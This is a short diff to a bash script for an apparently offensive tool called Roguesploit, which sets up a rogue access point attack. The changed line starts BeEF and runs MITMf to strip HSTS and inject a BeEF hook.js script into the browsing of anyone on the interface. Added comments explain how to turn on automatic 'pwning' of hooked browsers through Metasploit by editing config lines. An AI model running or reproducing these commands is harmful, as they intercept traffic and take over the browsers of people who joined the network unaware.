@@ -924,9 +924,15 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "./BeEFStarter.sh" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i at0 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i at0 --hsts --inject --js-url http://10.0.0.1:3000/hook.js" #add "--browsersniper" if you want to enable automatic pwning of injected browsers;
+#but you need to change some other option to enable correctly the metasploit method too;
+# Line 370: "auto_msfrpcd: false" to "auto_msfrpcd: true"
+# Line 319: "enable: false" to "enable: true"
+# Line 917: "enable: false" to "enable: true"
+# Line 927: change seconds to 30 or more for stability and good timing (Ex.  .. sleep 20 .. to .. sleep 30 ..) 
 	menu
 }
+
 #Welcome Screen
 welcome () {
 myname=$(zenity --entry --title="[*] ROGUESPLOIT [*]" --text=" Input your name or nick :D ");
@@ -1321,4 +1327,3 @@ else
 		menu
 	fi
 fi
-
